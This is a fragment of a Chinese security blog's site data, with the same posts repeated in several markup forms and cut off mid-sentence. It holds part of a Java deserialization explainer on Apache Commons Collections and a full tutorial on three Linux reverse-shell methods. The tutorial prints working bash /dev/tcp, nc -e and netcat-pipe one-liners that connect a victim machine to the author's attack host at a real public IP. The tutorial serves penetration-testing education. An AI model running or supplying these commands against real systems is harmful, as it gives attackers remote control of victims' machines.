class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> class <span class=\"title\">TestSerialize</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tString s = <span class=\"string\">\"test\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 将序列化对象写入文件中</span></span><br><span class=\"line\">\t\tFileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectOutputStream os = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">\t\tos.writeObject(s);</span><br><span class=\"line\">\t\tos.close;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 从文件中读取对象</span></span><br><span class=\"line\">\t\tFileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过反序列化恢复对象</span></span><br><span class=\"line\">\t\tString s1 = (String)ois.readObject();</span><br><span class=\"line\">\t\tois.close();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。</p>\n<p>所以这个问题的根源在于<code>ObjecInputStream</code>在反序列化时，没有对生成的对象的类型做限制。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x03-利用Apache-Commons-Collections实现远程代码执行\"><a href=\"#0x03-利用Apache-Commons-Collections实现远程代码执行\" class=\"headerlink\" title=\"0x03 利用Apache Commons Collections实现远程代码执行\"></a>0x03 利用Apache Commons Collections实现远程代码执行</h3></div><br></div>\n\n<p>本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。</p>\n<p>Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类<code>TransformedMap</code>，用来对Map进行某种转换，只需要调用<code>decorate()</code>函数，传入key和value的变换函数<code>Transformer</code>，就可以从任意Map对象生成相应的<code>TransformedMap</code>，decorate的函数如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>函数用来将一个对象转换为另一个对象，如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Transformer</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object input)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当Map中的任意key或value更改时，相应的<code>Transformer</code>就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链<code>ChainedTransformer</code>。Apache Commons Collections已经实现了一些<code>Transformer</code>，其中有一个可以通过java的反射机制调用任意函数，叫做<code>InvokerTransformer</code>,代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title\">Transformer</span>, <span class=\"title\">Serializable</span></span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InvokerTransformer</span><span class=\"params\">(String methodName, Class[] paramTypes, Object[] args)</span></span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。</p>\n<p>事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。</p>\n<p>确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-Java序列化和反序列化\"><a href=\"#0x02-Java序列化和反序列化\" class=\"headerlink\" title=\"0x02 Java序列化和反序列化\"></a>0x02 Java序列化和反序列化</h3></div><br></div>\n\n<p>今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。</p>\n<blockquote>\n<p>序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程<br>反序列化即逆过程，将字节流还原为对象</p>\n</blockquote>\n<p>java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。</p>\n<p>Java中的ObjectOutputStream类的<code>writeObject</code> 方法可以实现序列化，类<code>ObjectInputStream</code>类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> class <span class=\"title\">TestSerialize</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tString s = <span class=\"string\">\"test\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 将序列化对象写入文件中</span></span><br><span class=\"line\">\t\tFileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectOutputStream os = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">\t\tos.writeObject(s);</span><br><span class=\"line\">\t\tos.close;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 从文件中读取对象</span></span><br><span class=\"line\">\t\tFileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">\"object.ser\"</span>);</span><br><span class=\"line\">\t\tObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过反序列化恢复对象</span></span><br><span class=\"line\">\t\tString s1 = (String)ois.readObject();</span><br><span class=\"line\">\t\tois.close();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。</p>\n<p>所以这个问题的根源在于<code>ObjecInputStream</code>在反序列化时，没有对生成的对象的类型做限制。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x03-利用Apache-Commons-Collections实现远程代码执行\"><a href=\"#0x03-利用Apache-Commons-Collections实现远程代码执行\" class=\"headerlink\" title=\"0x03 利用Apache Commons Collections实现远程代码执行\"></a>0x03 利用Apache Commons Collections实现远程代码执行</h3></div><br></div>\n\n<p>本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。</p>\n<p>Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类<code>TransformedMap</code>，用来对Map进行某种转换，只需要调用<code>decorate()</code>函数，传入key和value的变换函数<code>Transformer</code>，就可以从任意Map对象生成相应的<code>TransformedMap</code>，decorate的函数如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>函数用来将一个对象转换为另一个对象，如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Transformer</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object input)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当Map中的任意key或value更改时，相应的<code>Transformer</code>就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链<code>ChainedTransformer</code>。Apache Commons Collections已经实现了一些<code>Transformer</code>，其中有一个可以通过java的反射机制调用任意函数，叫做<code>InvokerTransformer</code>,代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title\">Transformer</span>, <span class=\"title\">Serializable</span></span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InvokerTransformer</span><span class=\"params\">(String methodName, Class[] paramTypes, Object[] args)</span></span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Linux反弹shell的三种方法","date":"2018-11-06T03:55:30.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？\n\n而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 获取shell\n{% endnote %}\n</div>\n\n通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。\n\n我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。\n\n#### 通过bash反弹shell\n\n第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令`nc -lvvp 7777`,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令`bash -i >$ /dev/tcp/130.211.244.96/7777 0>&1`。\n\n`bash -i`的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，>&将标准错误输出重定向到标准输出中，0>&1将标准输入重定向到标准输出中。\n\n下面来看一下具体的效果，先在攻击机器上监听端口：\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上反弹shell：\n\n{% asset_img 1受害机反弹shell.jpg%}\n\n之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。\n\n{% asset_img 1攻击机获得shell.jpg %}\n\n#### 利用netcat反弹shell\n\n如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。\n\n同样，先在攻击机器上130.211.244.96开启监听端口`nc -lvvp 7777`，等待受害机器连接。\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上执行命令`nc -e /bin/bash 130.211.244.96 7777`,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。\n\n{% asset_img 2受害机反弹shell.jpg %}\n\n{% asset_img 2攻击机获得shell.jpg %}\n\n\n#### 利用管道反弹shell\n\nnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。\n\n首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。\n\n{% asset_img 3攻击机监听端口.jpg %}\n\n然后在受害机器上执行命令`nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778`，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。\n\n{% asset_img 3受害机反弹shell.jpg %}\n\n这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。\n\n{% asset_img 3攻击机获得shell.jpg %}\n\n\n<br>\n\n当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Linux反弹shell的三种方法.md","raw":"---\ntitle: Linux反弹shell的三种方法\ndate: 2018-11-06 11:55:30\ntags: ['安全','反弹shell','netcat', '渗透测试']\ncategories: 安全\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？\n\n而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 获取shell\n{% endnote %}\n</div>\n\n通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。\n\n我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。\n\n#### 通过bash反弹shell\n\n第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令`nc -lvvp 7777`,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令`bash -i >$ /dev/tcp/130.211.244.96/7777 0>&1`。\n\n`bash -i`的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，>&将标准错误输出重定向到标准输出中，0>&1将标准输入重定向到标准输出中。\n\n下面来看一下具体的效果，先在攻击机器上监听端口：\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上反弹shell：\n\n{% asset_img 1受害机反弹shell.jpg%}\n\n之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。\n\n{% asset_img 1攻击机获得shell.jpg %}\n\n#### 利用netcat反弹shell\n\n如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。\n\n同样，先在攻击机器上130.211.244.96开启监听端口`nc -lvvp 7777`，等待受害机器连接。\n\n{% asset_img 1攻击机监听端口.jpg %}\n\n在受害机器上执行命令`nc -e /bin/bash 130.211.244.96 7777`,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。\n\n{% asset_img 2受害机反弹shell.jpg %}\n\n{% asset_img 2攻击机获得shell.jpg %}\n\n\n#### 利用管道反弹shell\n\nnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。\n\n首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。\n\n{% asset_img 3攻击机监听端口.jpg %}\n\n然后在受害机器上执行命令`nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778`，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。\n\n{% asset_img 3受害机反弹shell.jpg %}\n\n这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。\n\n{% asset_img 3攻击机获得shell.jpg %}\n\n\n<br>\n\n当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Linux反弹shell的三种方法","published":1,"updated":"2018-11-29T09:59:50.619Z","_id":"cjpdmuzzh00064cv00gffzbl9","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？</p>\n<p>而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-获取shell\"><a href=\"#0x02-获取shell\" class=\"headerlink\" title=\"0x02 获取shell\"></a>0x02 获取shell</h3></div><br></div>\n\n<p>通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。</p>\n<p>我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。</p>\n<h4 id=\"通过bash反弹shell\"><a href=\"#通过bash反弹shell\" class=\"headerlink\" title=\"通过bash反弹shell\"></a>通过bash反弹shell</h4><p>第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令<code>nc -lvvp 7777</code>,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令<code>bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1</code>。</p>\n<p><code>bash -i</code>的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。</p>\n<p>下面来看一下具体的效果，先在攻击机器上监听端口：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上反弹shell：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1受害机反弹shell.jpg\">\n<p>之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机获得shell.jpg\">\n<h4 id=\"利用netcat反弹shell\"><a href=\"#利用netcat反弹shell\" class=\"headerlink\" title=\"利用netcat反弹shell\"></a>利用netcat反弹shell</h4><p>如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。</p>\n<p>同样，先在攻击机器上130.211.244.96开启监听端口<code>nc -lvvp 7777</code>，等待受害机器连接。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上执行命令<code>nc -e /bin/bash 130.211.244.96 7777</code>,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2受害机反弹shell.jpg\">\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2攻击机获得shell.jpg\">\n<h4 id=\"利用管道反弹shell\"><a href=\"#利用管道反弹shell\" class=\"headerlink\" title=\"利用管道反弹shell\"></a>利用管道反弹shell</h4><p>netcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。</p>\n<p>首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机监听端口.jpg\">\n<p>然后在受害机器上执行命令<code>nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778</code>，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3受害机反弹shell.jpg\">\n<p>这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机获得shell.jpg\">\n<p><br></p>\n<p>当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？</p>\n<p>而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-获取shell\"><a href=\"#0x02-获取shell\" class=\"headerlink\" title=\"0x02 获取shell\"></a>0x02 获取shell</h3></div><br></div>\n\n<p>通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。</p>\n<p>我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。</p>\n<h4 id=\"通过bash反弹shell\"><a href=\"#通过bash反弹shell\" class=\"headerlink\" title=\"通过bash反弹shell\"></a>通过bash反弹shell</h4><p>第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令<code>nc -lvvp 7777</code>,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令<code>bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1</code>。</p>\n<p><code>bash -i</code>的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。</p>\n<p>下面来看一下具体的效果，先在攻击机器上监听端口：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上反弹shell：</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1受害机反弹shell.jpg\">\n<p>之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机获得shell.jpg\">\n<h4 id=\"利用netcat反弹shell\"><a href=\"#利用netcat反弹shell\" class=\"headerlink\" title=\"利用netcat反弹shell\"></a>利用netcat反弹shell</h4><p>如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。</p>\n<p>同样，先在攻击机器上130.211.244.96开启监听端口<code>nc -lvvp 7777</code>，等待受害机器连接。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg\">\n<p>在受害机器上执行命令<code>nc -e /bin/bash 130.211.244.96 7777</code>,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。</p>\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2受害机反弹shell.jpg\">\n<img src=\"/posts/2018-11-06-Linux反弹shell的三种方法/2攻击机获得shell.jpg\">\n<h4 id=\"利用管道反弹shell\"><a href=\"#利用管道反弹shell\" class=\"headerlink\" title=\"利用管道反弹shell\"></a>利用管道反弹shell</h4><p>netcat的-e 